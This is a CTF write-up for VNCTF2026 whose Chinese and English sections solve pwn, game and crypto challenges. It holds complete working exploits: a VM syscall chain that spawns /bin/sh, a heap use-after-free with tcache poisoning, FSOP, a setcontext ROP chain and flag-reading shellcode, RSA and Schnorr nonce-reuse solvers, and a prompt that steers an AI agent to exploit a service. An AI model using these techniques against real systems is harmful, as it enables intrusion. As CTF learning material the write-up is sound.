# VNCTF2026
## vm_syscall
一血， 虽然只是起得早
能控寄存器执行syscall的vm， 结构体如下
```c
struct vm
{
  _BYTE *code_base;
  _DWORD PC;
  _DWORD padding;
  _QWORD reg[4];
  _DWORD op_idx[3];
  _DWORD padding2;
  _QWORD imm_val;
};
```
没开pie， 可以用SYS_BRK拿到可写地址用read写binsh， 然后执行SYS_EXECVE即可
```python
import re
import os
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
local = 0
ip = "114.66.24.228"
port = 30280
ELF_PATH="./pwn"
if local:
    p = process(ELF_PATH)
else:
    p = remote(ip,port)
elf = ELF(ELF_PATH)

def dbg():
    script = '''
# brva 0x1E19
brva 0x1DA3
    '''
    if local:
        gdb.attach(p,script)
    pause()

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')



# --- Opcode Constants ---
OP_MOV = 1
OP_IMM = 2
OP_REG = 3
OP_SYS = 4

# Sub-Opcodes
SUB_MOV_DST_SRC = 16 # Reg[Dst] = Reg[Src]
SUB_ADD = 16
SUB_SUB = 32
SUB_MUL = 48
SUB_XOR = 112

# Registers
R0, R1, R2, R3 = 0, 1, 2, 3


def inst_mov(dst, src):
    # Opcode 1: [1] [Dst] [Src] [SubOp]
    # We use SubOp 16 which implements Reg[Dst] = Reg[Src]
    return p8(OP_MOV) + p8(dst) + p8(src) + p8(SUB_MOV_DST_SRC)

def inst_imm(dst, src, val, sub_op):
    # Opcode 2: [2] [Dst] [Src] [Len] [Bytes...] [SubOp]
    if val == 0:
        val_bytes = b''
    else:
        # VM loads bytes in Big Endian
        val_bytes = val.to_bytes((val.bit_length() + 7) // 8, 'big')
    return p8(OP_IMM) + p8(dst) + p8(src) + p8(len(val_bytes)) + val_bytes + p8(sub_op)

def inst_reg(dst, src1, src2, sub_op):
    # Opcode 3: [3] [Dst] [Src1] [Src2] [SubOp]
    return p8(OP_REG) + p8(dst) + p8(src1) + p8(src2) + p8(sub_op)

def inst_syscall():
    return p8(OP_SYS)


bytecode = b''

# --- 1. Leak Heap Address: sys_brk(0) ---
# Reg0 = 12
bytecode += inst_imm(R0, R0, 12, SUB_ADD)
# Reg1 = 0 (Clear it first)
bytecode += inst_reg(R1, R1, R1, SUB_XOR)
# Syscall
bytecode += inst_syscall()

# R0 now holds heap address.

# --- 2. Calculate Buffer Address ---
# We'll use (HeapAddr - 0x100) as our scratch space.
# Reg2 = R0
bytecode += inst_mov(R2, R0)
# Reg2 = Reg2 - 256
bytecode += inst_imm(R2, R2, 256, SUB_SUB)

# --- 3. Read String: sys_read(0, Buffer, 100) ---
# Reg0 = 0 (sys_read). Clear R0 (it holds heap addr).
bytecode += inst_reg(R0, R0, R0, SUB_XOR)
# Reg1 = 0 (stdin). Already 0.
# Reg2 is Buffer.
# Reg3 = 100
bytecode += inst_imm(R3, R3, 100, SUB_ADD)
# Syscall
bytecode += inst_syscall()

# --- 4. Spawn Shell: sys_execve(Buffer, 0, 0) ---
# Reg0 = 59 (sys_execve). Clear R0 first (holds read count).
bytecode += inst_reg(R0, R0, R0, SUB_XOR)
bytecode += inst_imm(R0, R0, 59, SUB_ADD)
# Reg1 = Buffer. Move from Reg2.
bytecode += inst_mov(R1, R2)
# Reg2 = 0. Clear.
bytecode += inst_reg(R2, R2, R2, SUB_XOR)
# Reg3 = 0. Clear.
bytecode += inst_reg(R3, R3, R3, SUB_XOR)
# Syscall
bytecode += inst_syscall()

payload = bytecode.ljust(0x200, b'\x00')

# Append the string to be read by the VM
payload += b'/bin/sh\x00'


dbg()
p.sendafter(b'Enter your code:\n', payload)
p.interactive()


```

## eat some AI
游戏题， 先入为主猜商店购买整数溢出， 买完以后打boss直接拿shell。
先让用nc找漏洞

![image-20260201102421526](C:\Users\Operator\AppData\Roaming\Typora\typora-user-images\image-20260201102421526.png)

然后给ai写提示词让ai去打。

***先战斗， 遇到购买的时候输入比如说11451444之类的很大的数字触发整数溢出拿到好装备， 如果提示[系统] 总计需要支付: 343542000 积分， 这个积分是正数说明数字还不够大， 如果这个数字是负数说明成功了。先从11451444开始试。如果遇到恭喜你，渡夜者！之类的话就成功拿到shell了， 先列举目录获取flag文件的名字， 如果当前目录没有就去根目录找。找到flag的名字以后用命令读取并返回给我。***


![image-20260201102233718](C:\Users\Operator\AppData\Roaming\Typora\typora-user-images\image-20260201102233718.png)

## Recode
一血
经典堆题， 给了增删改查， 区别就是有个protobuf协议， 不让用b'\x20\x09\x0a\x0b\x0c\x0d'这几个字符 。
先是交互
```python
# --- Protobuf Encoding Helpers ---
def encode_varint(n):
    """Encodes an integer to Protobuf Varint format."""
    if n < 0: n += (1 << 64) 
    out = []
    while True:
        byte = n & 0x7F
        n >>= 7
        if n:
            out.append(byte | 0x80)
        else:
            out.append(byte)
            break
    return bytes(out)

def build_req(op_num=None, op_op=None, idx=None, val=None):
    """Constructs the raw bytes for a robot.OperationRequest."""
    payload = b''
    # Field 1: op_num (int32) -> Tag 8 (\x08)
    if op_num is not None:
        payload += b'\x08' + encode_varint(op_num)
    # Field 2: op_operator (string) -> Tag 18 (\x12)
    if op_op is not None:
        if isinstance(op_op, str): op_op = op_op.encode()
        payload += b'\x12' + encode_varint(len(op_op)) + op_op
    # Field 3: target_index (int32) -> Tag 24 (\x18)
    if idx is not None:
        payload += b'\x18' + encode_varint(idx)
    # Field 4: target_value (string) -> Tag 34 (\x22)
    if val is not None:
        if isinstance(val, str): val = val.encode()
        payload += b'\x22' + encode_varint(len(val)) + val
    return payload

def send_req(data):
    # Input is read via cin >> string, which breaks on whitespace.
    if any(b in data for b in b' \t\n\v\f\r'):
        log.warning("Payload contains bad bytes! Exploit may fail.")
        pause()
    p.sendline(data)
    sleep(0.1)
    

# Opcodes
OP_CHECK = 49374
OP_WRITE = -65535 # 0xFFFF0001
OP_READ  = -65534 # 0xFFFF0002
OP_EDIT  = -65533 # 0xFFFF0003
OP_THROW = -65532 # 0xFFFF0004

log.info("1. Handshake...")
send_req(build_req(op_num=OP_CHECK, val="ping"))
p.recvuntil(b"Server is healthy!")

log.info("2. Leaking Heap (Safe Linking Bypass)...")
# Allocate two chunks A and B
```
漏洞在ThrowThings里面

![image-20260201103238481](C:\Users\Operator\AppData\Roaming\Typora\typora-user-images\image-20260201103238481.png)

UAF漏洞， free之后指针没置0。

先用SHOW功能leak出堆和libc地址。

```python
for i in range (7):
    send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # 0-6
    p.recvuntil(b'!\n')

send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 7
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 8
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 9
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 10
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 11
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 12
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 13
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 14
p.recvuntil(b'!\n')

send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x10)) # idx 15
p.recvuntil(b'!\n')



send_req(build_req(OP_THROW, idx=1))
p.recvuntil(b'\n')
send_req(build_req(OP_THROW, idx=2))
p.recvuntil(b'\n')
send_req(build_req(OP_THROW, idx=3))
p.recvuntil(b'\n')
send_req(build_req(OP_THROW, idx=4))
p.recvuntil(b'\n')
send_req(build_req(OP_THROW, idx=5))
p.recvuntil(b'\n')
send_req(build_req(OP_THROW, idx=6))
p.recvuntil(b'\n')
send_req(build_req(OP_THROW, idx=7))
p.recvuntil(b'\n')

send_req(build_req(OP_THROW, idx=8))
p.recvuntil(b'\n')



# Read Index 1 (UAF Read). 
# Index 1's FD points to Index 0.
send_req(build_req(OP_READ, idx=8))
p.recvuntil(b'to send raw bytes. \n')
p.recv(5)
heap_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x20350
lg("heap_base")


send_req(build_req(OP_READ, idx=8))
p.recvuntil(b'to send raw bytes. \n')
p.recv(5)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x21ad60
lg("libc_base")
```

题目实际上一次操作处理了两个堆， op_op可以输入byte类型， val只能输入字符串。

打tcache poison， 覆写_IO_list_all。

```python
TCACHE_KEY = (heap_base + 0x1f620) >> 12
lg("TCACHE_KEY")

IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
# binsh = libc_base + libc.search('/bin/sh').__next__()
binsh = heap_base + 0x15800

system = 0xcafefefe
execve = libc_base + 0xeb080
leave_ret = libc_base + 0x000000000004da83

send_req(build_req(OP_WRITE, op_op="a"*0x28, val="b"*0x100)) # idx 8
send_req(build_req(OP_WRITE, op_op="c"*0x28, val="d"*0x110)) # idx 7
send_req(build_req(OP_THROW, idx=8))
send_req(build_req(OP_THROW, idx=7))



send_req(build_req(OP_EDIT, op_op=p64(_IO_list_all ^ TCACHE_KEY)[:6], idx=7, val=b''))
```

走_IO_wfile_overflow的链拿到RIP控制

由于system和onegadget的地址刚好有坏字符， 刚开始想用execve但是本地通了远程不行， 后来改用

setcontext和mov_rsp_rdx做栈迁移打read+mprotect+shellcode的orw成了。

完整exp：

```python
from pwn import *
import sys
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

local = 0
if args.GDB:
    local = 1
ip = "114.66.24.228"
port = 33142
ELF_PATH="./server"
if local:
    p = process(ELF_PATH)
else:
    p = remote(ip,port)
elf = ELF(ELF_PATH)
libc = ELF("./lib/libc.so.6")

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x, drop=True)
0x599f39fd4930
def dbg():
    script = '''
    disp/x $rebase(0x135E0)
brva 0x5A56
brva 0x50EA
brva 0x57A0
# brva 0x4CCB
b _IO_flush_all_lockp
b _IO_wfile_seekoff
b _IO_wfile_overflow
b _IO_switch_to_wget_mode
b _IO_wdoallocbuf
# b *$rebase(0x8e9c2)
    '''
    if local:
        gdb.attach(p,script)
    pause()

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')



# --- Protobuf Encoding Helpers ---
def encode_varint(n):
    """Encodes an integer to Protobuf Varint format."""
    if n < 0: n += (1 << 64) 
    out = []
    while True:
        byte = n & 0x7F
        n >>= 7
        if n:
            out.append(byte | 0x80)
        else:
            out.append(byte)
            break
    return bytes(out)

def build_req(op_num=None, op_op=None, idx=None, val=None):
    """Constructs the raw bytes for a robot.OperationRequest."""
    payload = b''
    # Field 1: op_num (int32) -> Tag 8 (\x08)
    if op_num is not None:
        payload += b'\x08' + encode_varint(op_num)
    # Field 2: op_operator (string) -> Tag 18 (\x12)
    if op_op is not None:
        if isinstance(op_op, str): op_op = op_op.encode()
        payload += b'\x12' + encode_varint(len(op_op)) + op_op
    # Field 3: target_index (int32) -> Tag 24 (\x18)
    if idx is not None:
        payload += b'\x18' + encode_varint(idx)
    # Field 4: target_value (string) -> Tag 34 (\x22)
    if val is not None:
        if isinstance(val, str): val = val.encode()
        payload += b'\x22' + encode_varint(len(val)) + val
    return payload

def send_req(data):
    # Input is read via cin >> string, which breaks on whitespace.
    if any(b in data for b in b' \t\n\v\f\r'):
        log.warning("Payload contains bad bytes! Exploit may fail.")
        pause()
    p.sendline(data)
    sleep(0.1)
    

# Opcodes
OP_CHECK = 49374
OP_WRITE = -65535 # 0xFFFF0001
OP_READ  = -65534 # 0xFFFF0002
OP_EDIT  = -65533 # 0xFFFF0003
OP_THROW = -65532 # 0xFFFF0004

log.info("1. Handshake...")
send_req(build_req(op_num=OP_CHECK, val="ping"))
p.recvuntil(b"Server is healthy!")

log.info("2. Leaking Heap (Safe Linking Bypass)...")
# Allocate two chunks A and B


for i in range (7):
    send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # 0-6
    p.recvuntil(b'!\n')

send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 7
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 8
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 9
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 10
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 11
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 12
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 13
p.recvuntil(b'!\n')
send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x70)) # idx 14
p.recvuntil(b'!\n')

send_req(build_req(OP_WRITE, op_op="A"*0x8, val="B"*0x10)) # idx 15
p.recvuntil(b'!\n')



send_req(build_req(OP_THROW, idx=1))
p.recvuntil(b'\n')
send_req(build_req(OP_THROW, idx=2))
p.recvuntil(b'\n')
send_req(build_req(OP_THROW, idx=3))
p.recvuntil(b'\n')
send_req(build_req(OP_THROW, idx=4))
p.recvuntil(b'\n')
send_req(build_req(OP_THROW, idx=5))
p.recvuntil(b'\n')
send_req(build_req(OP_THROW, idx=6))
p.recvuntil(b'\n')
send_req(build_req(OP_THROW, idx=7))
p.recvuntil(b'\n')

send_req(build_req(OP_THROW, idx=8))
p.recvuntil(b'\n')



# Read Index 1 (UAF Read). 
# Index 1's FD points to Index 0.
send_req(build_req(OP_READ, idx=8))
p.recvuntil(b'to send raw bytes. \n')
p.recv(5)
heap_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x20350
lg("heap_base")


send_req(build_req(OP_READ, idx=8))
p.recvuntil(b'to send raw bytes. \n')
p.recv(5)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x21ad60
lg("libc_base")

environ = libc_base + libc.sym['environ']
lg("environ")
_IO_list_all = libc_base + libc.sym['_IO_list_all']
lg("_IO_list_all")


TCACHE_KEY = (heap_base + 0x1f620) >> 12
lg("TCACHE_KEY")

IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
# binsh = libc_base + libc.search('/bin/sh').__next__()
binsh = heap_base + 0x15800

system = 0xcafefefe
execve = libc_base + 0xeb080
leave_ret = libc_base + 0x000000000004da83

send_req(build_req(OP_WRITE, op_op="a"*0x28, val="b"*0x100)) # idx 8
send_req(build_req(OP_WRITE, op_op="c"*0x28, val="d"*0x110)) # idx 7
send_req(build_req(OP_THROW, idx=8))
send_req(build_req(OP_THROW, idx=7))


dbg()
send_req(build_req(OP_EDIT, op_op=p64(_IO_list_all ^ TCACHE_KEY)[:6], idx=7, val=b''))

fake_io_addr = heap_base + 0x1580e
lg("fake_io_addr")
onegadget = libc_base + 0x50a47
rdx = fake_io_addr - 0x10
setcontext = libc_base + libc.sym['setcontext'] + 294
mov_rsp_rdx = libc_base + 0x5a11b
puts = libc_base + libc.sym['puts']

# 0x000000000005a120 : mov rsp, rdx ; ret

fake_context_addr = fake_io_addr + 0x40

ropchain_addr = fake_io_addr + 0xf0

fake_io=flat(
{
    # 0x0:[b'\x00'],    
    0x8: [p64(0)],
    0x10:[p64(1)],
    0x18:[p64(0)],
    0x20:[p64(0)],          
    0x28:[p64(1)],          
    0x48:[p64(system)],
    0x78:[p64(fake_context_addr)],
    0x88:[p64(fake_io_addr+0x90),p64(0),p64(setcontext)],  
    0xA0:[p64(fake_io_addr-0x10)],        
    0xA8:[p64(binsh)],   # rdi      
    0xc0:[p64(0)],          
    # 0xc8:[p64(0)],  # rdx
    0xc8:[p64(ropchain_addr)],  # rdx
    0xd0:[p64(fake_io_addr+0x30)], 
    0xd8:[p64(IO_wfile_jumps+0x30-0x30)],
    }, filler=b'\x00'
)

# fake_io += p64(0) + p64(execve) # ret addr    
# fake_io += p64(0) + p64(puts)
# fake_io += p64(0) + p64(libc_base + libc.sym['perror'])
fake_io += p64(0) + p64(mov_rsp_rdx)

pop_rdi = libc_base + 0x00000000001b672e
pop_rsi = libc_base + 0x0000000000174150
pop_rdx_r12 = libc_base + 0x000000000013b6b9
pop_rcx = libc_base + 0x000000000003d1ee
pop_rax = libc_base + 0x00000000000e6fd4
syscall_ret = libc_base + 0xea549
mprotect = libc_base + libc.sym['mprotect']

# ropchain begin
fake_io += p64(pop_rdi)
fake_io += p64(0)
fake_io += p64(pop_rsi)
fake_io += p64(heap_base)
fake_io += p64(pop_rdx_r12)
fake_io += p64(0x500)
fake_io += p64(0)
fake_io += p64(pop_rax)
fake_io += p64(0)
fake_io += p64(syscall_ret)

fake_io += p64(pop_rdi)
fake_io += p64(heap_base)
fake_io += p64(pop_rsi)
fake_io += p64(0x1000)
fake_io += p64(pop_rdx_r12)
fake_io += p64(7)
fake_io += p64(0)
fake_io += p64(mprotect)

fake_io += p64(heap_base)




send_req(build_req(OP_WRITE, op_op = b"e"*0x28, val="f"*0x120)) # idx 6



send_req(build_req(OP_WRITE, op_op=p64(fake_io_addr) + b"g"*0x20, val="h"*0x130)) # idx 5, the one

send_req(build_req(OP_WRITE, op_op = fake_io, val="f"*0x140))

# dbg()
# send_req(build_req(OP_READ, idx=1))
p.sendline(b'/bin/sh\x00')
pause()

shellcode = """
    mov rax, 0x67616c662f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 2
    syscall
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 1
    syscall
"""
p.send(asm(shellcode))

p.interactive()

# bad bytes: b'\x20\x09\x0a\x0b\x0c\x0d'


# 0x778462e53b06 <setcontext+294>:     mov    rcx,QWORD PTR [rdx+0xa8]
# 0x778462e53b0d <setcontext+301>:     push   rcx
# 0x778462e53b0e <setcontext+302>:     mov    rsi,QWORD PTR [rdx+0x70]
# 0x778462e53b12 <setcontext+306>:     mov    rdi,QWORD PTR [rdx+0x68]
# 0x778462e53b16 <setcontext+310>:     mov    rcx,QWORD PTR [rdx+0x98]
# 0x778462e53b1d <setcontext+317>:     mov    r8,QWORD PTR [rdx+0x28]
# 0x778462e53b21 <setcontext+321>:     mov    r9,QWORD PTR [rdx+0x30]
# 0x778462e53b25 <setcontext+325>:     mov    rdx,QWORD PTR [rdx+0x88]
# 0x778462e53b2c <setcontext+332>:     xor    eax,eax
# 0x778462e53b2e <setcontext+334>:     ret




# *RAX  0x5a34ee2e983e ◂— 0
#  RBX  0x5a34ee2e980e ◂— 0
#  RCX  0
#  RDX  0x5a34ee2e97fe ◂— 0x6473616473610000
#  RDI  0x5a34ee2e980e ◂— 0
#  RSI  0xffffffff
#  R8   0x726f13228290 —▸ 0x726f1321cce8 —▸ 0x726f130ac0b0 ◂— endbr64
#  R9   0x48
#  R10  0x726f130242b0 ◂— 0xb001200000b4b /* 'K\x0b' */
#  R11  0x726f130ac060 (std::error_category::~error_category()) ◂— endbr64
#  R12  0xffffffff
#  R13  0x7ffc36e03260 —▸ 0x726f12c8cfe0 ◂— endbr64
#  R14  0
#  R15  0x5a34ee2e980e ◂— 0
#  RBP  0x5a34ee2e980e ◂— 0
#  RSP  0x7ffc36e03210 ◂— 0xd68 /* 'h\r' */
# *RIP  0x726f12c83b9b (_IO_wdoallocbuf+43) ◂— call qword ptr [rax + 0x68]
```

![image-20260201104544087](C:\Users\Operator\AppData\Roaming\Typora\typora-user-images\image-20260201104544087.png)



## math_rsa

To solve this challenge, we need to analyze the mathematical assertion provided in the code to reveal the hidden relationship between the variables.

### Mathematical Analysis

The code asserts the following equality:
$$ (x^2 + 1)(y^2 + 1) - 2(x - y)(xy - 1) = 4(k + xy) $$

Let's simplify the Left Hand Side (LHS) algebraically.
Expand the terms:
$$ \text{LHS} = (x^2y^2 + x^2 + y^2 + 1) - 2(x^2y - x - xy^2 + y) $$
$$ \text{LHS} = x^2y^2 + x^2 + y^2 + 1 - 2x^2y + 2x + 2xy^2 - 2y $$

Group the terms by powers of $x$:
1.  **$x^2$ terms:** $x^2y^2 - 2x^2y + x^2 = x^2(y^2 - 2y + 1) = x^2(y - 1)^2$
2.  **$x$ terms:** $2xy^2 + 2x = 2x(y^2 + 1)$ (Wait, let's look closer at the full grouping)

Let's regroup differently to find a square pattern.
$$ \text{LHS} = x^2y^2 - 2x^2y + x^2 + 2xy^2 - 4xy + 2x + y^2 - 2y + 1 + 4xy $$
(I added and subtracted $4xy$ to help complete the square, but let's stick to the previous successful derivation).

Let's go back to the simplified form:
$$ x^2(y-1)^2 + (y^2 - 2y + 1) + 2x + 2xy^2 = \text{LHS} $$
This doesn't look quite right. Let's restart the reduction from the assertion:
$$ \text{LHS} = 4k + 4xy $$

Rearranging the expansion we did earlier:
$$ x^2(y-1)^2 + 2x(y^2+1) - 2y + y^2 + 1 = 4k + 4xy $$
Subtract $4xy$ from both sides:
$$ x^2(y-1)^2 + 2xy^2 + 2x - 4xy + y^2 - 2y + 1 = 4k $$
$$ x^2(y-1)^2 + 2x(y^2 - 2y + 1) + (y-1)^2 = 4k $$
$$ x^2(y-1)^2 + 2x(y-1)^2 + (y-1)^2 = 4k $$

Factor out $(y-1)^2$:
$$ (y-1)^2 \cdot (x^2 + 2x + 1) = 4k $$
$$ (y-1)^2 \cdot (x+1)^2 = 4k $$
Taking the square root:
$$ (y-1)(x+1) = 2\sqrt{k} $$

Now substitute the definitions from the code:
1.  $y = 2u + 1 \implies y - 1 = 2u$
2.  $x = \phi - 1 \implies x + 1 = \phi$

Substitute these back:
$$ (2u)(\phi) = 2\sqrt{k} $$
$$ u \cdot \phi = \sqrt{k} $$

### Solution Logic
We know $n \approx \phi$. Since $u$ is a 16-bit prime (very small compared to $n$ and $k$), we can estimate $u$ easily.
$$ u \approx \frac{\sqrt{k}}{n} $$

Once we find $u$, we can compute the exact $\phi = \frac{\sqrt{k}}{u}$.
With $\phi$, we can calculate the private key $d$ and decrypt the flag.

### Python Solver Script

Here is the script to solve the challenge:

```python name=solve.py
from Crypto.Util.number import long_to_bytes, inverse
import math

# --- Data from the challenge ---
n = 14070754234209585800232634546325624819982185952673905053702891604674100339022883248944477908133810472748877029408864634701590339742452010000798957135872412483891523031580735317558166390805963001389999673532396972009696089072742463405543527845901369617515343242940788986578427709036923957774197805224415531570285914497828532354144069019482248200179658346673726866641476722431602154777272137461817946690611413973565446874772983684785869431957078489177937408583077761820157276339873500082526060431619271198751378603409721518832711634990892781578484012381667814631979944383411800101335129369193315802989383955827098934489
e = 65537
c = 12312807681090775663449755503116041117407837995529562718510452391461356192258329776159493018768087453289696353524051692157990247921285844615014418841030154700106173452384129940303909074742769886414052488853604191654590458187680183616318236293852380899979151260836670423218871805674446000309373481725774969422672736229527525591328471860345983778028010745586148340546463680818388894336222353977838015397994043740268968888435671821802946193800752173055888706754526261663215087248329005557071106096518012133237897251421810710854712833248875972001538173403966229724632452895508035768462851571544231619079557987628227178358
k = 485723311775451084490131424696603828503121391558424003875128327297219030209620409301965720801386755451211861235029553063690749071961769290228672699730274712790110328643361418488523850331864608239660637323505924467595552293954200495174815985511827027913668477355984099228100469167128884236364008368230807336455721259701674165150959031166621381089213574626382643770012299575625039962530813909883594225301664728207560469046767485067146540498028505317113631970909809355823386324477936590351860786770580377775431764048693195017557432320430650328751116174124989038139756718362090105378540643587230129563930454260456320785629555493541609065309679709263733546183441765688806201058755252368942465271917663774868678682736973621371451440269201543952580232165981094719134791956854961433894740133317928275468758142862373593473875148862015695758191730229010960894713851228770656646728682145295722403096813082295018446712479920173040974429645523244575300611492359684052455691388127306813958610152185716611576776736342210195290674162667807163446158064125000445084485749597675094544031166691527647433823855652513968545236726519051559119550903995500324781631036492013723999955841701455597918532359171203698303815049834141108746893552928431581707889710001424400

# Calculate sqrt(k)
# From derivation: (y-1)(x+1) = 2*sqrt(k) => 2u * phi = 2*sqrt(k) => u * phi = sqrt(k)
sqrt_k = math.isqrt(k)

if sqrt_k * sqrt_k != k:
    print("Warning: k is not a perfect square!")
    exit()

# Estimation: phi is slightly less than n
# u = sqrt(k) / phi > sqrt(k) / n
u_approx = sqrt_k // n

# Search for the exact u near our approximation
# u must be a divisor of sqrt_k
u = 0
for i in range(u_approx, u_approx + 5000):
    if sqrt_k % i == 0:
        u = i
        break

if u == 0:
    print("Could not find u")
    exit()

phi = sqrt_k // u

# RSA Decrypt
# m = c^d mod n
# d = e^-1 mod phi
d = inverse(e, phi)
m = pow(c, d, n)
flag = long_to_bytes(m)

print(f"Found u: {u}")
print(f"Flag: {flag.decode()}")
```

Found u: 49531
Flag: VNCTF{hell0_rsa_w0rld!}

## Schnorr

The vulnerability in this challenge lies in the **initialization of the Random Number Generator (RNG)** combined with how CTF challenges are typically deployed.

### The Vulnerability: Deterministic RNG & Nonce Reuse

1. **Static Seed**: The code imports `init_seed` from `secret.py`. Since `secret.py` is a file on the server, `init_seed` is a constant value.

2. **Deterministic State**: The `SecureSchnorrProver` initializes its RNG using this seed:

   Python

   ```
   self._init_deterministic_rng(init_seed)
   ```

   This means that every time the program starts, the RNG state is identical.

3. **Process Restarts**: In a network challenge (hosted via `socat` or `xinetd`), a new process is spawned for every incoming connection. Because the seed is static, **every connection starts with the exact same RNG state**.

4. **The Flaw**: Consequently, the "random" nonce `b` generated for the first round of the protocol is **identical** across different connections. This allows for a **Nonce Reuse Attack** on the Schnorr protocol.

### The Attack Math

The server calculates the response $z$ using the linear equation:

$$z \equiv x \cdot a + b \pmod{p-1}$$

Where:

- $z$ is the response (we receive this).
- $x$ is the challenge (we choose this).
- $a$ is the secret flag (we want this).
- $b$ is the random nonce (unknown).

Since $b$ is the same across two different connections, we can set up a system of equations:

1. **Connection 1**: We send $x_1 = 1$.

   $$z_1 \equiv 1 \cdot a + b \pmod{p-1}$$

2. **Connection 2**: We send $x_2 = 2$.

   $$z_2 \equiv 2 \cdot a + b \pmod{p-1}$$

Subtracting the first equation from the second eliminates $b$:

$$z_2 - z_1 \equiv (2a + b) - (a + b) \pmod{p-1}$$

$$z_2 - z_1 \equiv a \pmod{p-1}$$

The secret $a$ is simply the difference between the two responses.

### Exploit Script

Here is the solve script using `pwntools`.

Python

```python
from pwn import *
from Crypto.Util.number import long_to_bytes

# --- Configuration ---
# Change these to match the actual challenge IP and Port
HOST = 'localhost'
PORT = 1337

def get_proof_values(challenge_x):
    """
    Connects to the server, sends a challenge x, and retrieves:
    p (modulus), B (commitment), z (response)
    """
    # Connect to the remote server
    # Use process(['python3', 'chal.py']) for local testing (requires dummy secret.py)
    io = remote(HOST, PORT)

    # 1. Parse Public Parameters
    io.recvuntil(b"p = ")
    p = int(io.recvline().strip())
    
    io.recvuntil(b"g = ")
    g = int(io.recvline().strip())
    
    # 2. Parse Commitment (B)
    io.recvuntil(b"--- Round 1 ---")
    io.recvuntil(b"B = ")
    B = int(io.recvline().strip())

    # 3. Send Challenge
    io.sendlineafter(b"x = ", str(challenge_x).encode())

    # 4. Parse Response (z)
    io.recvuntil(b"z = ")
    z = int(io.recvline().strip())
    
    io.close()
    return p, z, B

def solve():
    context.log_level = 'info'
    print("[-] Starting Nonce Reuse Attack...")

    # --- Session 1 ---
    # We choose x=1 to get the equation: z1 = a + b
    log.info("Session 1: Sending x=1...")
    p1, z1, B1 = get_proof_values(1)

    # --- Session 2 ---
    # We choose x=2 to get the equation: z2 = 2a + b
    # Because the seed is static, 'b' (and thus commitment 'B') will be identical to Session 1
    log.info("Session 2: Sending x=2...")
    p2, z2, B2 = get_proof_values(2)

    # Sanity Check: Verify nonce reuse occurred
    if B1 != B2:
        log.error("Commitments B1 and B2 are different! The RNG might not be deterministic/resetting.")
        return
    log.success("Nonce reuse confirmed (B1 == B2).")

    # --- Recover the Flag ---
    # Math: z2 - z1 = a
    log.info("Calculating secret 'a'...")
    
    modulus = p1 - 1
    a = (z2 - z1) % modulus
    
    print(f"[+] Recovered secret a: {a}")
    
    try:
        flag = long_to_bytes(a).decode()
        print(f"\n[SUCCESS] FLAG: {flag}\n")
    except Exception as e:
        print(f"[!] Could not decode flag. Raw bytes: {long_to_bytes(a)}")

if __name__ == "__main__":
    solve()
```



Starting Nonce Reuse Attack...
Session 1: Sending x=1...
Opening connection to 114.66.24.228 on port 33406: Done
Closed connection to 114.66.24.228 port 33406
Session 2: Sending x=2...
Opening connection to 114.66.24.228 on port 33406: Done
Closed connection to 114.66.24.228 port 33406
Nonce reuse confirmed (B1 == B2).
Calculating secret 'a'...
Recovered secret a: 12081423192638285189190397666457089401588746104342788935902074166683378318471745197970942892101713683325

[SUCCESS] FLAG: VNCTF{40f6d237-70c9-454d-96dc-70be3de5cc2c}



## NumberGuesser

The provided Python code implements a challenge involving the Mersenne Twister (MT19937) pseudo-random number generator (PRNG).

### Vulnerability Analysis

1. **PRNG State Leakage (Mersenne Twister)**:

   The challenge generates a list of hints: `self.hints = [random.getrandbits(32) for _ in range(self.n)]`. Since `self.n` is 624, this exposes the *entire* internal state of the MT19937 generator (which consists of 624 32-bit integers).

   Although the code limits us to `MAX_CHANCES = 10` queries, we only need a few specific values to predict the *next* output of the generator.

2. **Predictable AES Key**:

